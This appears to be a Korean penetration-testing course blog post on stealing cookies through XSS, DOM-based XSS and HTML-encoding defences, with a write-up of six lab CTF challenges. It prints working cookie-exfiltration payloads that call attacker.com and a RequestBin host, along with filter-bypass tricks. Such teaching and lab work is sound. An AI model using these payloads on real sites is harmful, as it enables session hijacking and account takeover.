--- meta
title: Penetration Testing | Week 10
date: 2025/06/18
excerpt: 쿠키 탈취 기법과 DOM-Based XSS
categories: 모의 해킹
---

### 강의 노트

#### XSS 취약점의 활용(Exploitation)

9주차에 XSS 취약점을 탐지하는 방법에 대해서 학습하였고, 해당 취약점의 존재를 입증하기 위한 PoC 코드로 `alert(1);`를 활용하였다. 그런데 실제로 XSS 취약점을 활용하여 수행할 수 있는 공격에는 어떤 것들이 있을까?

대표적인 공격 중 하나로 쿠키 정보를 탈취하여 세션 ID를 확보하는 방식이 있다. 다음의 예시 스크립트를 살펴 보자.

```javascript
var cookieData = document.cookie;
var img = new Image();
img.src = "http://attacker.com/?cookie=" + cookieData;
```

위 스크립트는 현재 웹페이지에 저장된 쿠키 정보(`document.cookie`)를 `cookieData` 변수에 저장한다. 이후 `Image()` 함수를 통해 이미지 객체를 생성하는데, 이때 이미지 객체의 `src` 속성에 주소를 지정하면 브라우저가 지정된 주소로 요청을 전송하여 이미지 데이터 수신을 시도한다. 이 주소에 공격자의 서버 주소를 삽입하고 쿼리 스트링에 `cookieData` 값을 추가하여 전송하면 피해자의 쿠키 정보가 공격자 서버로 전달된다.

XSS 취약점에 `alert(1);` 대신 위와 같은 스크립트를 삽입하면 피해자의 세션 ID를 획득할 수 있다. 세션 ID는 일반적으로 사용자의 로그인 정보 및 인증 상태를 식별하는 데 사용되므로, 이를 공격자가 탈취할 경우 해당 사용자의 권한으로 시스템에 접근하는 등 중대한 보안 위협이 발생할 수 있다.

---

#### DOM-Based XSS

**DOM-Based XSS**란 삽입된 악성 스크립트가 서버를 거치지 않고 브라우저에서 DOM을 조작하는 코드에 의해 실행되는 XSS 공격을 의미한다.

<style>
  .dom-html {
    @media (min-width: 840px) {
      display: inline-block;
      width: 345px;
      margin: 8px 9px 0 0 !important;
    }
  }

  .dom-tree {
    @media (min-width: 840px) {
      display: inline-block;
      width: 345px;
      margin: 8px 0 0 0 !important;
    }
  }
</style>

> <strong>DOM(Document Object Model)</strong>
>
> **DOM**은 HTML 문서를 계층적 트리 구조로 표현한 객체 기반의 인터페이스이다. 이 모델은 웹 브라우저가 문서 구조를 이해하고, JavaScript를 통해 문서의 구조·내용 등을 동적으로 조작할 수 있도록 지원한다.
>
> 다음은 간단한 HTML 문서와 그에 해당하는 DOM 트리의 예시이다.
>
> <pre class="dom-html"><code class="language-html hljs language-xml" data-highlighted="yes"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
> <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
>   <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
>     <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>DOM<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
>   <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
>   <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
>     <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>header<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
>     <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>paragraph<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
>   <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
> <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
> </code></pre>
>
> <pre class="dom-tree"><code class="language-c hljs" data-highlighted="yes">document
> └── html
>     ├── head
>     │   └── title
>     │       └── <span class="hljs-string">"DOM"</span>
>     └── body
>         ├── h1
>         │   └── <span class="hljs-string">"header"</span>
>         └── p
>             └── <span class="hljs-string">"paragraph"</span>
> </code></pre>

실제 웹 사이트에서의 예시를 통해 DOM-Based XSS의 동작 방식을 자세히 살펴 보자.

![DOM-Based XSS](/data/Penetration%20Testing%20%7C%20Week%2010/1.png)

XSS CTF에서와 같은 회원제 게시판 애플리케이션이다. 이때 검색 창에 `test`를 입력하고 검색을 수행하면 다음과 같이 화면에 `test` 텍스트가 출력된다.

![DOM-Based XSS](/data/Penetration%20Testing%20%7C%20Week%2010/2.png)

따라서 서버 응답에 입력한 검색어가 포함되어 전송되며, XSS 취약점이 존재할 가능성이 있다는 것을 유추할 수 있다.

![DOM-Based XSS](/data/Penetration%20Testing%20%7C%20Week%2010/3.png)

하지만 Burp Suite를 사용하여 패킷을 확인해 보면 서버 응답에 `test`라는 텍스트는 존재하지 않는다는 것을 알 수 있다. 그렇다면 어떻게 해당 메시지가 화면에 출력된 것일까?

![DOM-Based XSS](/data/Penetration%20Testing%20%7C%20Week%2010/4.png)

그 원인은 이 페이지에서 실행되는 Javascript 코드에 있다. script 태그 내에 작성된 코드는 현재 URL의 쿼리 스트링에서 `board_result` 값을 추출한 뒤, 해당 값을 검색란에 자동으로 채워 넣음과 동시에 해당 검색어에 대한 검색 결과 부재 메시지를 화면에 출력한다. 이렇듯 Javascript를 활용해 DOM을 직접 조작할 수 있으며, 해당 코드를 바탕으로 브라우저가 HTML 문서의 내용을 동적으로 구성하는 과정에서 공격자가 삽입한 악성 스크립트가 실행될 수 있다.

DOM-Based XSS는 사용자로부터 전달된 값이 서버 응답에 직접 포함되지 않는다는 특성이 있으며, 브라우저에서 실행되는 Javascript의 동작을 분석해야만 탐지할 수 있기 때문에 Stored XSS나 Reflected XSS에 비해 취약점 발견이 어려운 편이다. 따라서 Javascript 코드 내에 `document.write()`, `innerHTML` 등의 DOM 조작 API가 존재하는 경우 이를 주의 깊게 점검해 보는 것이 바람직하다.

---

#### XSS 대응 방법

##### HTML 인코딩

XSS 공격을 방지하는 기본적인 대응 방법 중 하나는 HTML 특수 문자를 **HTML Entity**로 변환하는 것으로, 이를 **HTML 인코딩**이라고 한다. HTML Entity란 웹 브라우저가 특수 문자를 문자 그대로 표시하도록 만들어진 문자 표현 방식이다. 예를 들어, `<`, `'`, `"`, `>`와 같은 문자들은 HTML에서 태그를 정의하는 등 문법적인 역할을 가지기 때문에, 그대로 출력하면 코드로 해석될 수 있다. 이를 방지하기 위해 해당 문자들을 각각 `&lt;`, `&apos;`, `&quot;`, `&gt;` 등의 HTML Entity로 변환하여 출력하면 브라우저가 이를 단순한 텍스트로 인식하게 되며, 이로 인해 삽입된 악성 스크립트의 실행을 원천적으로 차단할 수 있다. 예를 들어, `<script>alert('XSS');</script>`라는 입력을 `&lt;script&gt;alert(&apos;XSS&apos;);&lt;/script&gt;`와 같이 인코딩하여 출력하면 화면에 해당 스크립트 태그가 노출될 뿐 실제로 실행되지 않는다.

HTML 인코딩은 간단하고 효과적인 XSS 방어 기법이지만, 상황에 따라 한계가 존재한다. 특히 Javascript 코드 내부나 URL 등에 값이 삽입되는 경우에는 HTML 인코딩만으로는 충분하지 않으며, 해당 맥락에 맞는 별도의 인코딩이나 필터링이 필요할 수 있다.

<br>
<br>
<br>

### 과제

#### XSS CTF

![XSS CTF](/data/Penetration%20Testing%20%7C%20Week%2010/5.png)

9주차에 XSS 취약점을 탐색했던 CTF 환경에서 쿠키 탈취 기법을 실습해 보자.

<br>

##### XSS 1

<img src="/data/Penetration%20Testing%20%7C%20Week%2010/6.png" alt="XSS 1" style="padding: 0 200px; background-color: white">

취약점 탐색 과정에서 게시판의 글쓰기 페이지(글 제목)에 XSS 취약점이 존재한다는 것을 확인하였다. 따라서 글쓰기 페이지로 이동 후 다음과 같이 악성 스크립트가 포함된 페이로드를 작성하였다.

![XSS 1](/data/Penetration%20Testing%20%7C%20Week%2010/7.png)

글 제목에 입력한 페이로드는 다음과 같다.

```html
<script>
  var cookieData = document.cookie;
  var img = new Image();
  img.src = "https://zgcsqwt.request.dreamhack.games/?cookie=" + cookieData;
</script>
```

앞서 살펴본 쿠키 탈취 스크립트와 동일한 형태이다. `img.src`에 지정된 URL은 수신된 HTTP 요청의 내용을 확인할 수 있도록 설정된 **RequestBin** 서비스의 **엔드포인트**이며, 해당 경로로 전송된 요청은 요청 시점의 사용자 쿠키 정보를 포함하게 된다.

> **RequestBin**
>
> **RequestBin**이란 외부 클라이언트 또는 서버로부터 발생하는 HTTP 요청의 상세 내용을 실시간으로 수신·확인할 수 있도록 설계된 도구를 말한다. 일반적으로 사용자가 직접 구축한 서버 환경에서 요청을 수신하고, 해당 요청의 헤더 및 본문 정보를 로그 등을 통해 수동으로 확인해야 하나, RequestBin을 활용할 경우 별도의 서버 구성 없이도 이를 대체할 수 있다. 사용자는 RequestBin에서 발급된 고유 **엔드포인트**를 요청 수신 지점으로 지정함으로써, 해당 URL로 도달한 모든 HTTP 요청의 상세 정보를 웹 환경에서 즉시 열람할 수 있다.
>
> 본 문서에서는 Dreamhack Tools 서비스가 제공하는 RequestBin 도구를 사용하였다.

글을 생성하고 나면 다음과 같이 게시물 목록 페이지에서 제목에 악성 스크립트가 포함된 게시물이 등록된 것을 확인할 수 있다.

![XSS 1](/data/Penetration%20Testing%20%7C%20Week%2010/8.png)

관리자를 해당 게시물에 접근시키면 관리자의 쿠키 정보를 RequestBin에서 조회할 수 있다. 따라서 우선 해당 게시물을 클릭하여 URL을 확인하였다.

![XSS 1](/data/Penetration%20Testing%20%7C%20Week%2010/9.png)

게시물 열람 페이지의 URL을 확인한 후, 관리자 방문 Bot 페이지에서 관리자가 해당 URL로 접근하도록 하였다.

![XSS 1](/data/Penetration%20Testing%20%7C%20Week%2010/10.png)

이후 RequestBin에서 요청이 정상적으로 수신되었고, 쿠키 정보에 플래그가 포함되어 출력되었다.

<img src="/data/Penetration%20Testing%20%7C%20Week%2010/11.png" alt="XSS 1" style="padding: 0 150px; background-color: white">

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">StoredSavedXSS</span>}</span></p>

<br>

##### XSS 2

<img src="/data/Penetration%20Testing%20%7C%20Week%2010/12.png" alt="XSS 2" style="padding: 0 200px; background-color: white">

취약점 탐색 과정에서 게시판의 검색 창에 XSS 취약점이 존재한다는 것을 확인하였다. 따라서 검색 창에서 다음과 같이 악성 스크립트가 포함된 페이로드를 검색하였다.

![XSS 2](/data/Penetration%20Testing%20%7C%20Week%2010/13.png)

입력한 페이로드는 다음과 같다.

<pre><code class="language-js hljs language-javascript" data-highlighted="yes"><span class="hljs-string">'</span>);
<span class="hljs-keyword">var</span> cookieData = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
<span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://zgcsqwt.request.dreamhack.games/?cookie="</span> + cookieData;
(<span class="hljs-string">'</span>
</code></pre>

검색을 수행한 후 `<script>` 태그 내에 정상적으로 악성 스크립트가 포함된 것을 확인하였다.

![XSS 2](/data/Penetration%20Testing%20%7C%20Week%2010/14.png)

검색 요청 URL을 관리자 Bot에게 접속시키면 관리자의 쿠키 정보를 획득할 수 있다. 검색 데이터가 POST 방식으로 전송되고 있었으므로, 요청 방식을 변경한 뒤 URL을 복사하였다.

![XSS 2](/data/Penetration%20Testing%20%7C%20Week%2010/15.png)

복사한 URL을 관리자 방문 Bot 페이지에 붙여 넣은 후 관리자가 해당 URL로 접근하도록 하였다.

![XSS 2](/data/Penetration%20Testing%20%7C%20Week%2010/16.png)

이후 RequestBin에서 요청이 정상적으로 수신되었고, 쿠키 정보에 플래그가 포함되어 출력되었다.

<img src="/data/Penetration%20Testing%20%7C%20Week%2010/17.png" alt="XSS 2" style="padding: 0 150px; background-color: white">

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">refrefrefXSS</span>}</span></p>

<br>

##### XSS 3

<img src="/data/Penetration%20Testing%20%7C%20Week%2010/18.png" alt="XSS 3" style="padding: 0 200px; background-color: white">

취약점 탐색 과정에서 마이페이지에 XSS 취약점이 존재한다는 것을 확인하였다. 따라서 마이페이지로 이동하여 `user` 파라미터를 다음과 같이 악성 스크립트가 포함된 값으로 변경하였다.

![XSS 3](/data/Penetration%20Testing%20%7C%20Week%2010/19.png)

입력한 페이로드는 다음과 같다.

<pre><code class="language-html hljs language-xml" data-highlighted="yes"><span class="hljs-string">"</span>/&gt;
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">
  <span class="hljs-keyword">var</span> cookieData = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
  <span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
  img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://zgcsqwt.request.dreamhack.games/?cookie="</span> + cookieData;
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
&lt;
</code></pre>

`user` 파라미터를 변경한 후 `<script>` 태그의 내용을 확인해 보았다.

![XSS 3](/data/Penetration%20Testing%20%7C%20Week%2010/20.png)

서버 응답을 살펴 보니 `+`가 URL 인코딩된 공백 문자로 처리되어, `<script>` 태그 내에서 공백 문자로 디코딩되어 출력된 것을 확인할 수 있었다. 따라서 `+`를 올바르게 인식시키기 위해 `+`의 URL 인코딩 결과인 `%2B`를 대신 사용하여 요청을 다시 전송하였다.

![XSS 3](/data/Penetration%20Testing%20%7C%20Week%2010/21.png)

수정 이후 `<script>` 태그의 내용에 정상적으로 악성 스크립트가 포함된 것을 확인하였다. 이어서 관리자 방문 Bot 페이지에 해당 URL을 입력한 후 관리자가 접근하도록 하였다.

![XSS 3](/data/Penetration%20Testing%20%7C%20Week%2010/22.png)

이후 RequestBin에서 요청이 정상적으로 수신되었고, 쿠키 정보에 플래그가 포함되어 출력되었다.

<img src="/data/Penetration%20Testing%20%7C%20Week%2010/23.png" alt="XSS 3" style="padding: 0 150px; background-color: white">

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">myPageReflected</span>}</span></p>

<br>

##### XSS 4

<img src="/data/Penetration%20Testing%20%7C%20Week%2010/24.png" alt="XSS 4" style="padding: 0 200px; background-color: white">

취약점 탐색 과정에서 게시판의 글쓰기 페이지에 XSS 취약점이 존재한다는 것을 확인하였다. 따라서 글쓰기 페이지로 이동 후 다음과 같이 악성 스크립트가 포함된 페이로드를 작성하였다.

![XSS 4](/data/Penetration%20Testing%20%7C%20Week%2010/25.png)

`script` 문자열이 빈 문자열로 치환되고 있었으므로, `scrscriptipt`를 대신 사용하여 중앙의 `script`가 제거되고 정상적인 `<script>` 태그로 복원되도록 유도하였다.

글을 생성한 후, 게시물을 열람하면 서버 응답에 정상적으로 악성 스크립트가 포함됨을 확인하였다.

![XSS 4](/data/Penetration%20Testing%20%7C%20Week%2010/26.png)

게시물 열람 페이지의 URL을 확인한 후, 관리자 방문 Bot 페이지에서 관리자가 해당 URL로 접근하도록 하였다.

![XSS 4](/data/Penetration%20Testing%20%7C%20Week%2010/27.png)

이후 RequestBin에서 요청이 정상적으로 수신되었고, 쿠키 정보에 플래그가 포함되어 출력되었다.

<img src="/data/Penetration%20Testing%20%7C%20Week%2010/28.png" alt="XSS 4" style="padding: 0 150px; background-color: white">

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">blAckFiltering</span>}</span></p>

<br>

##### XSS 5

<img src="/data/Penetration%20Testing%20%7C%20Week%2010/29.png" alt="XSS 5" style="padding: 0 200px; background-color: white">

취약점 탐색 과정에서 게시판의 글쓰기 페이지에 XSS 취약점이 존재한다는 것을 확인하였다. 다만 해당 페이지에 HTML 인코딩을 수행하는 Javascript 코드가 있었으므로, 서버 응답을 변조함으로써 이를 제거한 후 다음과 같이 악성 스크립트가 포함된 페이로드를 작성하였다.

![XSS 5](/data/Penetration%20Testing%20%7C%20Week%2010/30.png)

글을 생성한 후, 게시물을 열람하면 서버 응답에 정상적으로 악성 스크립트가 포함됨을 확인하였다.

![XSS 5](/data/Penetration%20Testing%20%7C%20Week%2010/31.png)

게시물 열람 페이지의 URL을 확인한 후, 관리자 방문 Bot 페이지에서 관리자가 해당 URL로 접근하도록 하였다.

![XSS 5](/data/Penetration%20Testing%20%7C%20Week%2010/32.png)

이후 RequestBin에서 요청이 정상적으로 수신되었고, 쿠키 정보에 플래그가 포함되어 출력되었다.

<img src="/data/Penetration%20Testing%20%7C%20Week%2010/33.png" alt="XSS 5" style="padding: 0 150px; background-color: white">

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">ClientCheckNone</span>}</span></p>

<br>

##### XSS 6

<img src="/data/Penetration%20Testing%20%7C%20Week%2010/34.png" alt="XSS 6" style="padding: 0 200px; background-color: white">

취약점 탐색 과정에서 로그인 페이지에 XSS 취약점이 존재한다는 것을 확인하였다. 따라서 로그인 페이지로 이동 후 다음과 같이 악성 스크립트가 포함된 페이로드를 입력하였다.

![XSS 6](/data/Penetration%20Testing%20%7C%20Week%2010/35.png)

입력한 페이로드는 다음과 같다.

<pre><code class="language-js hljs language-javascript" data-highlighted="yes"><span class="hljs-string">'</span>);
<span class="hljs-keyword">var</span> cookieData = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
<span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://zgcsqwt.request.dreamhack.games/?cookie="</span> + cookieData;
(<span class="hljs-string">'</span>
</code></pre>

로그인 시도 후 `<script>` 태그의 내용에 정상적으로 악성 스크립트가 포함된 것을 확인하였다.

![XSS 6](/data/Penetration%20Testing%20%7C%20Week%2010/36.png)

이때 한 가지 문제에 직면했는데, RequestBin 측에 HTTP 요청이 정상적으로 수신되지 않는 현상이 발생했기 때문이었다. 그 이유를 파악하기 위해 다양한 자료를 조사해본 결과, 해당 문제가 두 번째 `<script>` 태그에 포함된 리다이렉션 코드에 기인하는 것으로 확인되었다.

일반적으로 웹 브라우저에서 Javascript를 통해 HTTP 요청을 전송할 경우 그 처리는 **비동기적**으로 이루어진다. 다시 말해, 네트워크 요청이 실제로 이루어지기 전에 뒤따르는 스크립트가 중단 없이 계속해서 실행(정확히는 Javascript가 모두 실행된 이후에 요청이 전송됨)되는 것이다. 그러나 Javascript 실행 중 리다이렉션 명령이 호출됨으로써, 네트워크 요청이 전송되기 이전에 클라이언트 측에서 다른 페이지로의 전환이 발생하였다. 이로 인해 원래 의도된 HTTP 요청이 중단되었고, 결과적으로 RequestBin에서는 해당 요청을 수신하지 못하게 된 것이다.

이 문제를 해결하기 위해 페이로드를 다음과 같이 수정하였다.

<pre><code class="language-js hljs language-javascript" data-highlighted="yes"><span class="hljs-string">'</span>);
<span class="hljs-keyword">var</span> cookieData = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">"https://zgcsqwt.request.dreamhack.games/?cookie="</span> + cookieData;
(<span class="hljs-string">'</span>
</code></pre>

`login.html`로의 리다이렉션 코드는 수정할 수 없으므로, 해당 스크립트보다 상위에 RequestBin 엔드포인트로의 리다이렉션 코드를 삽입하여 뒤의 코드를 무효화하는 방법을 선택하였다.

![XSS 6](/data/Penetration%20Testing%20%7C%20Week%2010/37.png)

페이로드 수정 후 악성 스크립트가 정상적으로 삽입되는 것을 확인하였다. 로그인 데이터가 POST 방식으로 전송되고 있었으므로, 요청 방식을 변경한 뒤 URL을 복사하였다.

![XSS 6](/data/Penetration%20Testing%20%7C%20Week%2010/38.png)

복사한 URL을 관리자 방문 Bot 페이지에 붙여 넣은 후 관리자가 해당 URL로 접근하도록 하였다.

![XSS 6](/data/Penetration%20Testing%20%7C%20Week%2010/39.png)

이후 RequestBin에서 요청이 정상적으로 수신되었고, 쿠키 정보에 플래그가 포함되어 출력되었다.

<img src="/data/Penetration%20Testing%20%7C%20Week%2010/40.png" alt="XSS 6" style="padding: 0 150px; background-color: white">

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">keyLogger</span>}</span></p>